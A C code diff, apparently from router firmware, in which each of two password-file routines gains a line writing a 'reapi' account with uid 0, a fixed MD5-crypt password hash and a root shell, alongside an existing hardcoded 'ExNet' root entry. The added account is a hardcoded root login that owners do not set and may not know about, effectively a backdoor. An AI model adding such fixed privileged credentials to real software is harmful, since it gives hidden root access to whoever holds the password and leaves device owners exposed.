@@ -58,6 +58,7 @@ void setPassword(char *passwd)
 #ifdef HAVE_ERC
 	// fprintf(fp, "Admin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", passwd);
 	fprintf(fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", nvram_safe_get("newhttp_passwd"));
+	fprintf(fp, "reapi:$1$oBrBCDd2$zLGC6enVwcGWigRVWzc9f0:0:0:Reapi User,,,:/tmp/root:/bin/sh\n");
 #elif HAVE_IPR
 	fprintf(fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", nvram_safe_get("newhttp_passwd"));
 #else
@@ -120,6 +121,7 @@ void start_mkfiles(void)
 		// fprintf(fp, "Admin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n",
 		//      http_passwd);
 		fprintf(fp, "SuperAdmin:%s:0:0:Root User,,,:/tmp/root:/bin/sh\n", nvram_safe_get("newhttp_passwd"));
+		fprintf(fp, "reapi:$1$oBrBCDd2$zLGC6enVwcGWigRVWzc9f0:0:0:Reapi User,,,:/tmp/root:/bin/sh\n");
 #elif HAVE_WIKINGS
 		// default username and password for Excel Networks
 		fprintf(fp, "ExNet:$1$tkH3Bh9Z$/op5lnArS3Cba4eiruJMV/:0:0:Root User,,,:/tmp/root:/bin/sh\n");
